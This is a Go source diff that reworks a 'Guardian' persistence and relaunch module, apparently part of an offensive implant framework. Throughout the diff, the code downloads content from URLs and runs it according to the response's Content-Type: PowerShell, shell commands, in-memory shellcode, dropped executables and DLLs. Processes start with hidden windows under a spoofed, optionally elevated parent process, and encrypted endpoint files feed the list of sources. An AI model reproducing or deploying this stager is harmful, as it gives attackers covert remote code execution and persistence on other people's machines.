@@ -22,6 +22,10 @@ import (
 )
 
 const (
+	// Self is a constant that can be used to reference the current executable path without
+	// using the 'os.Executable' function.
+	Self = "*"
+
 	timeout    = time.Second * 2
 	timeoutWeb = time.Second * 30
 )
@@ -42,6 +46,8 @@ var (
 			ResponseHeaderTimeout: timeoutWeb,
 		},
 	}
+
+	filterAny = (&cmd.Filter{Fallback: true}).SetElevated(device.Local.Elevated)
 )
 
 // Check will attempt to contact any current Guardians watching on the supplied name. This function returns false
@@ -74,14 +80,18 @@ func Check(n string) bool {
 	}
 	return false
 }
-func file(p ...string) error {
+func exec(f *cmd.Filter, p ...string) error {
 	e := cmd.NewProcess(p...)
-	e.SetParentRandomEx(nil, device.Local.Elevated)
+	if f == nil {
+		e.SetParent(filterAny)
+	} else {
+		e.SetParent(f)
+	}
 	e.SetWindowDisplay(0)
 	e.SetNoWindow(true)
 	return e.Start()
 }
-func read(r io.Reader) ([]string, error) {
+func readRaw(r io.Reader) ([]string, error) {
 	var (
 		b      = *bufs.Get().(*[]byte)
 		n, err = r.Read(b[0:2])
@@ -114,7 +124,7 @@ func read(r io.Reader) ([]string, error) {
 	}
 	return s, err
 }
-func write(w io.Writer, s []string) error {
+func writeRaw(w io.Writer, s []string) error {
 	var (
 		n      = len(s)
 		_, err = w.Write([]byte{byte(n >> 8), byte(n)})
@@ -132,114 +142,54 @@ func write(w io.Writer, s []string) error {
 	}
 	return nil
 }
-func web(x context.Context, u string) error {
-	var (
-		q, c = context.WithTimeout(x, timeout*5)
-		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
-	)
-	i, err := client.Do(r)
-	if c(); err != nil {
-		return err
-	}
-	b, err := ioutil.ReadAll(i.Body)
-	if i.Body.Close(); err != nil {
-		return err
-	}
-	switch strings.ToLower(i.Header.Get("Content-Type")) {
-	case "powershell", "application/powershell":
-		if device.OS == device.Windows {
-			return file("powershell.exe", "-Comm", string(b))
-		}
-		return file("pwsh", "-Comm", string(b))
-	case "cmd", "execute", "script", "application/cmd", "application/script":
-		if device.OS == device.Windows {
-			return file("cmd.exe", "/c", string(b))
-		}
-		return file("sh", "-c", string(b))
-	case "shellcode", "code", "binary", "bin", "application/binary", "application/executable", "application/shellcode":
-		e := cmd.Code{Data: b}
-		e.SetParentRandomEx(nil, device.Local.Elevated)
-		return e.Start()
-	}
-	f, err := ioutil.TempFile("", "sys")
-	if err != nil {
-		return err
-	}
-	_, err = f.Write(b)
-	if f.Close(); err != nil {
-		return err
-	}
-	os.Chmod(f.Name(), 0755)
-	return file(f.Name())
-}
 
 // Wake will attempt to contact any current Guardians watching on the supplied name. The Sentinel will launch a
 // Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
 // will return true and nil if a Guardian is launched and false and nil if a Guardian was found.
 func Wake(name string, paths ...string) (bool, error) {
-	return WakeContext(context.Background(), name, paths...)
+	return WakeContext(context.Background(), name, nil, paths...)
 }
 
 // Encode will attempt to write the data of the suplied string array into a encode byte array. If the supplied Cipher
 // block is not nil, this will attempt to use the Cipher and append a randomized IV value to the beginning of the
 // output. This function returns an error if the encoding fails.
 func Encode(c cipher.Block, s []string) ([]byte, error) {
-	var (
-		b   *bytes.Buffer
-		err error
-	)
-	if c == nil {
-		err = write(b, s)
-	} else {
-		err = writeCipher(b, c, s)
+	var b *bytes.Buffer
+	if err := write(b, c, s); err != nil {
+		return nil, err
 	}
-	return b.Bytes(), err
+	return b.Bytes(), nil
 }
-
-// EncodeFile will attempt to write the data of the supplied string array into to the specified file path. If the
-// supplied Cipher block is not nil, this will attempt to use the Cipher and append a randomized IV value to the
-// beginning of the file. This function returns an error if the write or file creation errors occur.
-func EncodeFile(file string, c cipher.Block, s []string) error {
-	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
-	if err != nil {
-		return err
-	}
+func read(r io.Reader, c cipher.Block) ([]string, error) {
 	if c == nil {
-		err = write(f, s)
-	} else {
-		err = writeCipher(f, c, s)
+		return readRaw(r)
 	}
-	f.Close()
-	return err
-}
-func readCipher(r io.Reader, c cipher.Block) ([]string, error) {
 	var (
-		n               = c.BlockSize()
-		l               = n
-		s      []string = nil
-		b, a   []byte   = *bufs.Get().(*[]byte), nil
-		_, err          = r.Read(b[:n])
+		n             = c.BlockSize()
+		l             = n
+		s    []string = nil
+		b, a []byte   = *bufs.Get().(*[]byte), nil
+		err  error
 	)
-	if err == nil && n > len(b) {
-		a, l = make([]byte, n-len(b)), len(b)
+	if len(b) < n {
+		l = len(b)
+	}
+	if _, err = r.Read(b[:l]); err == nil && n > len(b) {
+		a = make([]byte, n-len(b))
 		_, err = r.Read(a)
 	}
 	if err == nil {
 		i, _ := crypto.DecryptReader(c, append(b[:l], a...), r)
-		s, err = read(i)
+		s, err = readRaw(i)
 		i.Close()
 	}
 	bufs.Put(&b)
 	return s, err
 }
-
-// WakeFile will attempt to look for a Guardian using the following parameters specified. This includes a
-// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
-// the 'Encode' or 'EncodeFile' functions and can use the supplied cipher block if needed.
-func WakeFile(name, file string, c cipher.Block) (bool, error) {
-	return WakeFileContext(context.Background(), name, file, c)
-}
-func writeCipher(w io.Writer, c cipher.Block, s []string) error {
+func write(w io.Writer, c cipher.Block, s []string) error {
+	if c == nil {
+		return writeRaw(w, s)
+	}
 	var (
 		n           = c.BlockSize()
 		l           = n
@@ -255,33 +205,119 @@ func writeCipher(w io.Writer, c cipher.Block, s []string) error {
 	}
 	if err == nil {
 		o, _ := crypto.EncryptWriter(c, append(b[:l], a...), w)
-		err = write(o, s)
+		err = writeRaw(o, s)
 		o.Close()
 	}
 	bufs.Put(&b)
 	return err
 }
 
-// WakeContext will attempt to contact any current Guardians watching on the supplied name. This will launch a
-// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
-// will return true and nil if a Guardian is launched and false and nil if a Guardian was found. This function
-// will additionally take a Context that can be used to cancel any attempts when downloading.
-func WakeContext(x context.Context, name string, paths ...string) (bool, error) {
-	if Check(name) {
-		return false, nil
+// EncodeFile will attempt to write the data of the supplied string array into to the specified file path. If the
+// supplied Cipher block is not nil, this will attempt to use the Cipher and append a randomized IV value to the
+// beginning of the file. This function returns an error if the write or file creation errors occur.
+func EncodeFile(file string, c cipher.Block, s []string) error {
+	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
+	if err != nil {
+		return err
 	}
-	if len(paths) == 0 {
+	err = write(f, c, s)
+	f.Close()
+	return err
+}
+
+// WakeFile will attempt to look for a Guardian using the following parameters specified. This includes a
+// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
+// the 'Encode' or 'EncodeFile' functions and can use the supplied cipher block if needed.
+func WakeFile(name, file string, c cipher.Block) (bool, error) {
+	return WakeFileContext(context.Background(), name, file, c, nil)
+}
+func download(x context.Context, f *cmd.Filter, u string) error {
+	var (
+		q, c = context.WithTimeout(x, timeout*5)
+		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
+	)
+	i, err := client.Do(r)
+	if c(); err != nil {
+		return err
+	}
+	b, err := ioutil.ReadAll(i.Body)
+	if i.Body.Close(); err != nil {
+		return err
+	}
+	var d bool
+	switch strings.ToLower(i.Header.Get("Content-Type")) {
+	case "cmd/dll", "application/dll":
+		d = true
+	case "cmd/powershell", "application/powershell":
+		if device.OS == device.Windows {
+			return exec(f, "powershell.exe", "-Comm", string(b))
+		}
+		return exec(f, "pwsh", "-Comm", string(b))
+	case "cmd/cmd", "cmd/execute", "cmd/script", "application/cmd", "application/execute", "application/script":
+		if device.OS == device.Windows {
+			return exec(f, "cmd.exe", "/c", string(b))
+		}
+		return exec(f, "sh", "-c", string(b))
+	case "cmd/binary", "cmd/code", "cmd/shellcode", "application/binary", "application/code", "application/shellcode":
+		e := cmd.Code{Data: b}
+		if f == nil {
+			e.SetParent(filterAny)
+		} else {
+			e.SetParent(f)
+		}
+		return e.Start()
+	}
+	var n string
+	if d {
+		n = "dll"
+	} else if device.OS == device.Windows {
+		n = "exe"
+	} else {
+		n = "sys"
+	}
+	z, err := ioutil.TempFile("", n)
+	if err != nil {
+		return err
+	}
+	_, err = z.Write(b)
+	if z.Close(); err != nil {
+		return err
+	}
+	if d {
+		e := cmd.NewDLL(z.Name())
+		if f == nil {
+			e.SetParent(filterAny)
+		} else {
+			e.SetParent(f)
+		}
+		return e.Start()
+	}
+	os.Chmod(z.Name(), 0755)
+	return exec(f, z.Name())
+}
+func wake(x context.Context, f *cmd.Filter, p []string) (bool, error) {
+	if len(p) == 0 {
 		return false, ErrNoEndpoints
 	}
 	var err error
-	for i := range paths {
-		if len(paths[i]) == 0 {
+	for i := range p {
+		if len(p[i]) == 0 {
 			continue
 		}
-		if strings.HasPrefix(paths[i], "http") {
-			err = web(x, paths[i])
-		} else if _, err = os.Stat(paths[i]); err == nil {
-			err = file(paths[i])
+		switch {
+		case p[i] == Self:
+			e, err1 := os.Executable()
+			if err1 != nil {
+				err = err1
+			} else {
+				err = exec(f, e)
+			}
+		case strings.HasPrefix(p[i], "http"):
+			err = download(x, f, p[i])
+		default:
+			if _, err = os.Stat(p[i]); err == nil {
+				err = exec(f, p[i])
+			}
 		}
 		if err == nil {
 			return true, nil
@@ -293,23 +329,35 @@ func WakeContext(x context.Context, name string, paths ...string) (bool, error) 
 	return false, ErrNoEndpoints
 }
 
+// WakeContext will attempt to contact any current Guardians watching on the supplied name. This will launch a
+// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
+// will return true and nil if a Guardian is launched and false and nil if a Guardian was found. This function
+// will additionally take a Context that can be used to cancel any attempts when downloading.
+//func WakeContext(x context.Context, name string, paths ...string) (bool, error) {
+func WakeContext(x context.Context, name string, f *cmd.Filter, paths ...string) (bool, error) {
+	if Check(name) {
+		return false, nil
+	}
+	return wake(x, f, paths)
+}
+
 // WakeFileContext will attempt to look for a Guardian using the following parameters specified. This includes a
 // local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
 // the 'Encode' or 'EncodeFile' functions. This function will additionally take a Context that can be used to
 // cancel any attempts when downloading.
-func WakeFileContext(x context.Context, name, file string, c cipher.Block) (bool, error) {
-	f, err := os.OpenFile(file, os.O_RDONLY, 0)
+//
+//.func WakeFileContext(x context.Context, name, file string, c cipher.Block) (bool, error) {
+func WakeFileContext(x context.Context, name, file string, c cipher.Block, f *cmd.Filter) (bool, error) {
+	if Check(name) {
+		return false, nil
+	}
+	d, err := os.OpenFile(file, os.O_RDONLY, 0)
 	if err != nil {
 		return false, err
 	}
-	var s []string
-	if c == nil {
-		s, err = read(f)
-	} else {
-		s, err = readCipher(f, c)
-	}
-	if f.Close(); err != nil {
+	s, err := read(d, c)
+	if d.Close(); err != nil {
 		return false, err
 	}
-	return WakeContext(x, name, s...)
+	return wake(x, f, s)
 }
